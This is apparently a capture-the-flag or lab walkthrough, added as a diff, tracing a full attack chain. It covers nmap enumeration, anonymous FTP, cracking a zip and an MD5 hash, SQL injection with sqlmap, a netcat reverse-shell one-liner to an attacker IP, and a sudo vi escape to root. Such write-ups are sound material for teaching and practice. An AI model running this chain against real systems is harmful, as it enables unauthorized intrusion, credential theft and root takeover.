@@ -1,0 +1,71 @@
+Major topic: SQL Injection
+tool use : zip2john, john, sqlmap, MD5_cracker, Burpsuit proxy
+
+First : Enumeration
+command : nmap -sC -sV -O nmap <target_ip>
+
+we can find the open service is ftp, ssh, http
+and its OS: Unix, Linux; CPE: cpe:/o:linux:linux_kernel (Common Platform Enumeration)
+
+login ftp with anonymous
+command : ftp target_ip
+
+get the backup.zip
+
+when you want to unzip the file, it need password.
+so you can use the tool zip2john to extract a password hash.
+
+command : zip2john backup.zip > hash.txt (then crack the hash with John the Ripper.)
+
+command : john --wordlist=path_to_dictionary hash.txt
+
+After extracting the archive, the web page's code could be obtained.
+Analyzing the code there were hard coded credentials.
+username is admin, password was hashed with the MD5.
+user the web tool "Crackstation" to reverse the hash code.
+
+Wtih these credentials it was possible to log in to the web app.
+
+On the admin interface it was possible to search inside a database.
+The parameter search was tested for a SQL injection
+
+First of all the session variable was obtained with the developer tools
+
+use sqlmap to try its vulnerabilities of Injection.
+
+command : sqlmap -u http://target_ip/<web_app>.php?search=test --cookie 'PHPSESSID=XXXXXXXXXXXXXXXXXXXXXXXX'
+
+Second : Initial Access
+
+This SQL injection vulnerability could be used to obtain a reverse shell.
+After running the following commands it was possible to connect back to the attacker machine.
+
+command : sqlmap -u http://target_ip/<web_app>.php?search=test --cookie 'PHPSESSID=XXXXXXXXXXXXXXXXXXXXXXXX' --os-shell
+
+when you get the os-shell, try to reverse shell with nc.
+
+os-shell> rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc attacker_ip port > /tmp/f
+
+and we can surf the target_machine, usally browse the var/www for first,
+to explore any other account & password for the service.
+we can find another connection with in /var/www/html/dashboard.php
+
+with these credentials it was possible to login via SSH and get a better shell.
+
+command : ssh postgres@target_ip
+
+The "sudo -l" command was run to check if the postgres user can run command in a context of another user.
+
+command : sudo -l
+
+Third : Privilege Escalation
+
+The above command can be used to spawn a root shell. First of all the above vi command has been run with sudo.
+
+command : sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+By running inside the vi editor, the following commands could spawn to root shell.
+
+command in vi ":set shell=/bin/sh"
+command in vi ":shell"
+
